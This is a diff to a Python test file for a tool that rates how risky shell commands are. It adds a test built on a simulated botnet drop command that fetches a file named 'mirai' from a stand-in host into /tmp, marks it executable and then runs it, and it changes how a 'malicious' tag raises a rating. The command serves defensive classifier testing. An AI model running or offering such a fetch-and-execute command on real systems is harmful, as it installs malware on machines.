@@ -56,10 +56,19 @@ def test_running_a_file_not_downloaded_is_not_critical():
     assert level_for_command("./configure", []) == "low"
 
 
+def test_sim_bot_drop_is_high_until_it_runs():
+    drop = "cd /tmp; wget http://dl.bot-sim.invalid/mirai; chmod +x mirai"
+    assert level_for_command(drop, []) == "high"
+    assert level_for_command(drop + "; ./mirai", []) == "critical"
+    # a malicious family name keeps it at high, so it's a stone golem, not a dragon
+    assert apply("med", level_for_command(drop, []), "malicious") == "high"
+
+
 def test_malicious_bumps_one_level():
     assert apply("low", "low", "malicious") == "med"
     assert apply("low", "med", "malicious") == "high"
-    assert apply("low", "high", "malicious") == "critical"
+    # critical needs running something, a bad name alone stops at high
+    assert apply("low", "high", "malicious") == "high"
     assert apply("low", "critical", "malicious") == "critical"
 
 
